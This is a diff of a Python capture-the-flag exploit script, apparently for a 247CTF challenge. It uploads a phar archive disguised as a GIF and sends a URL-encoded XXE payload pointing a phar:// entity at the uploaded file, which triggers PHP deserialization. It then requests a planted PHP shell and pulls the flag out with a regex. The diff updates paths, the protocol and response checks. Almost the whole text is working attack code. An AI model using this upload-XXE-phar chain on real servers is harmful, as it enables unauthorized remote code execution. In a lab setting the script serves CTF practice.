@@ -22,29 +22,33 @@ tmp = subprocess.check_output(["php","generatePhar.php"])
 print("[*] Uploading Phar/image...")
 phar_img = open("poc.phar","rb").read()
 f = {"image":("poc.gif", phar_img, "image/gif")}
-r = requests.post('http://%s'%RHOST,
+r = requests.post('https://%s'%RHOST,
     files=f)
 
-if 'Uploaded' not in r.text:
+if 'uploaded' not in r.text:
     print("[-] Failed")
     sys.exit(-1)
 
+img_name = r.text[:-1].split("/")[-1]
+print("    -- " + img_name)
+
 print("[*] POST'ing XML...")
 payload = urllib.parse.quote('<!DOCTYPE foo [<!ELEMENT foo ANY>'+\
-    '<!ENTITY % xxe SYSTEM "phar:///var/www/html/images/poc.gif">%xxe;]><message><to></to><from></from>'+\
-    '<title></title><body>F</body></message>')
-r = requests.post('http://%s'%RHOST,
+    '<!ENTITY % xxe SYSTEM "phar:///tmp/images/'+img_name+'">%xxe;]><message><to></to><from></from>'+\
+    '<image></image></message>')
+r = requests.post('https://%s'%RHOST,
     data='message='+payload,
     headers={'Content-Type':'application/x-www-form-urlencoded'}
 )
-
-if 'saved!' not in r.text:
+print(r.text)
+if 'stored' not in r.text:
     print("[-] Failed")
     sys.exit(-1)
 
 print("[*] Removing phar/image...")
 subprocess.Popen(["rm","poc.phar"])
 
-r = requests.get("http://%s/images/shell.php" % RHOST)
+r = requests.get("https://%s/z.php" % RHOST)
+print(r.text)
 print("[*] Retrieving flag...")
 print("    -- "+re.search(r"247CTF\{[0-9a-f]{32}\}",r.text)[0])
